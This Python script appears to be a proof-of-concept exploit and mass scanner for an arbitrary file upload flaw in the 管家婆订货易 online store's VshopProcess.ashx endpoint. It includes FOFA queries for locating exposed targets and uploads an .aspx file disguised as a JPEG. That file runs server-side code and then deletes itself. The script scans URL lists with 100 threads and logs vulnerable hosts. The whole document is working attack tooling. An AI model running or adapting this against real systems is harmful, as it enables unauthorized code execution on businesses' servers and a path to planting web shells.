#管家婆订货易在线商城 VshopProcess 任意文件上传漏洞

#fofa语法：title="订货易" || title="管家婆分销ERP" || body="管家婆分销ERP" || body="ERP V3"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

 __      __  _                 _____                             
 \ \    / / | |               |  __ \                            
  \ \  / /__| |__   ___  _ __ | |__) | __ ___   ___ ___  ___ ___ 
   \ \/ / __| '_ \ / _ \| '_ \|  ___/ '__/ _ \ / __/ _ \/ __/ __|
    \  /\__ \ | | | (_) | |_) | |   | | | (_) | (_|  __/\__ \__ \
     \/ |___/_| |_|\___/| .__/|_|   |_|  \___/ \___\___||___/___/
                        | |                                      
                        |_|                                      
                                                                                                                                                                                                                                        
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="管家婆订货易在线商城")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/API/VshopProcess.ashx?action=PostFileImg'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/57.0.578.100 Safari/537.36',
        'Connection': 'close',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5',
        'Content-Length': '323'
    }
    data ='''
       ------WebKitFormBoundarytCOFhbEjc3IfYaY5
        Content-Disposition: form-data; name="fileup1i"; filename="ceshi.aspx"
        Content-Type: image/jpeg

        <%@ Page Language="C#" %>
        <% 
        Response.Write("Hello World!");
        System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]);
        %>

        ------WebKitFormBoundarytCOFhbEjc3IfYaY5--
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "/Storage/UserFileImg/" in res.text:
            print(f"f[+]该url存在任意文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件上传漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()